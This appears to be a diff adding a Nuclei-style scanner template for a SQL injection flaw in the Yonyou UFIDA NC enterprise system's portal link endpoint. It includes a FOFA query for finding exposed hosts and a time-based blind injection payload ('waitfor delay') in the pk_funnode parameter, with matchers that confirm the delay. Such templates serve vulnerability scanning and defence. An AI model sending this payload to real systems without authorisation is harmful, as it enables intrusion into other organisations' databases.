@@ -1,0 +1,29 @@
+id: yonyou-UFIDA-NC-link-content-sqli
+
+info:
+  name: 用友NC系统接口link存在SQL注入漏洞
+  author: xx
+  severity: high
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,sqli
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+        - type: dsl
+          dsl:
+            - 'duration>=3 && duration<8'
+            - 'status_code_1 == 200'
+          condition: and
